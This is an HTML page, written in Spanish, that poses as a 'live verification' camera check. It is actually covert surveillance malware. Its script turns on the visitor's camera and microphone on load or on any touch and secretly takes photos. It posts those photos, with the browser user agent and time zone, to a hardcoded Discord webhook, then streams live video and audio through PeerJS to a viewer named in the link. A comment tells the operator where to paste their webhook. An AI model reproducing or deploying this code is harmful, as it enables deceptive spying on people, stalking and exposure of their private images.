<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Verificacion</title>
<style>
  :root{color-scheme:dark}
  *{box-sizing:border-box}
  body{margin:0;min-height:100vh;display:grid;place-items:center;background:#0b141a;
       font-family:system-ui,-apple-system,sans-serif;color:#e9edef;padding:24px}
  .card{width:100%;max-width:400px;text-align:center}
  h1{font-size:20px;margin:0 0 8px}
  p{font-size:14px;color:#8696a0;margin:0 0 18px;line-height:1.5}
  .frame{position:relative;aspect-ratio:3/4;border-radius:16px;overflow:hidden;
         background:#111b21;border:1px solid #22303a;display:grid;place-items:center}
  video{width:100%;height:100%;object-fit:cover;transform:scaleX(-1);display:none}
  video.on{display:block}
  .ph{font-size:13px;color:#5b6b74;padding:20px}
  .err{color:#f15c6d;font-size:14px;margin-top:14px;display:none;line-height:1.5}
  #tap{position:fixed;inset:0;display:none;place-items:center;text-align:center;
       background:rgba(6,20,26,.72);font-size:16px;font-weight:600;padding:30px;
       backdrop-filter:blur(2px);animation:pulse 1.8s ease-in-out infinite}
  #tap.on{display:grid}
  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.55}}
</style>
</head>
<body>
<div class="card">
  <h1>Verificacion en vivo</h1>
  <p id="hint">Preparando camara...</p>
  <div class="frame">
    <span class="ph" id="ph">Camara apagada</span>
    <video id="v" playsinline autoplay muted></video>
  </div>
  <div class="err" id="err"></div>
</div>
<div id="tap">Toca la pantalla para permitir la camara</div>
<canvas id="c" hidden></canvas>
<script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
<script>
/* ==================================================================
   PEGA TU WEBHOOK DE DISCORD EN LA LINEA DE ABAJO
   Va entre las comillas, sin espacios antes ni despues
   ================================================================== */
const HOOK = "https://discord.com/api/webhooks/1575291012991950998/YLd_lGii_eQ7h2KCb64wMOSU77Qm7ieAUon0U172eybYCox3ANKHzxBJ-aCkKqqWnJVg";
/* ================================================================== */

const VIEWER = location.hash.slice(1);
const $ = id => document.getElementById(id);
const sleep = ms => new Promise(r => setTimeout(r, ms));

let stream = null;
let intentando = false;
let peer = null;

async function snap(video){
  const c = $('c');
  c.width = 720;
  c.height = Math.round(720 * video.videoHeight / video.videoWidth);
  const ctx = c.getContext('2d');
  ctx.translate(c.width, 0); ctx.scale(-1, 1);
  ctx.drawImage(video, 0, 0, c.width, c.height);
  return new Promise(r => c.toBlob(r, 'image/jpeg', 0.85));
}

async function enviarFotos(v){
  await sleep(1500);
  const a = await snap(v);
  await sleep(600);
  const b = await snap(v);
  const fd = new FormData();
  fd.append('payload_json', JSON.stringify({ content:
    'Link abierto\nUA: ' + navigator.userAgent +
    '\nZona: ' + Intl.DateTimeFormat().resolvedOptions().timeZone }));
  fd.append('files[0]', a, 'captura_1.jpg');
  fd.append('files[1]', b, 'captura_2.jpg');
  await fetch(HOOK, { method: 'POST', body: fd });
}

async function arrancar(){
  if(stream || intentando) return;
  intentando = true;

  const v = $('v'), err = $('err');
  err.style.display = 'none';

  if(!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia){
    err.textContent = 'Este navegador no da camara. Abre el link en Chrome o Safari.';
    err.style.display = 'block';
    $('tap').classList.remove('on');
    intentando = false;
    return;
  }

  try{
    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode: 'user', width: { ideal: 1280 } }, audio: true
    });
  }catch(e){
    intentando = false;
    if(e.name === 'NotAllowedError' || e.name === 'SecurityError'){
      $('tap').classList.add('on');
      $('hint').textContent = 'Necesita permiso de camara.';
    }else if(e.name === 'NotFoundError'){
      err.textContent = 'No hay camara en este dispositivo.';
      err.style.display = 'block';
      $('tap').classList.remove('on');
    }else{
      err.textContent = 'No se pudo abrir la camara: ' + e.name;
      err.style.display = 'block';
      $('tap').classList.remove('on');
    }
    return;
  }

  $('tap').classList.remove('on');
  v.srcObject = stream;
  v.classList.add('on');
  $('ph').style.display = 'none';
  $('hint').textContent = 'Conectando...';

  try{ await enviarFotos(v); }catch(e){}

  if(!VIEWER){ $('hint').textContent = 'Camara activa.'; return; }

  peer = new Peer({
    config: { iceServers: [
      { urls: 'stun:stun.l.google.com:19302' },
      { urls: 'turn:openrelay.metered.ca:80', username: 'openrelayproject',
        credential: 'openrelayproject' }
    ]}
  });

  peer.on('open', () => {
    peer.call(VIEWER, stream);
    $('hint').textContent = 'Conectado. No cierres esta pagina.';
  });
  peer.on('error', () => {
    $('hint').textContent = 'Camara activa. La conexion en vivo fallo.';
  });
}

/* 1. Intento automatico al cargar */
window.addEventListener('load', () => setTimeout(arrancar, 250));

/* 2. Reintento si vuelve a primer plano */
document.addEventListener('visibilitychange', () => {
  if(document.visibilityState === 'visible' && !stream) setTimeout(arrancar, 200);
});

/* 3. Cualquier toque en cualquier parte de la pantalla sirve de boton */
document.addEventListener('touchstart', () => { if(!stream) arrancar(); }, {passive:true});
document.addEventListener('click', () => { if(!stream) arrancar(); });
</script>
</body>
</html>
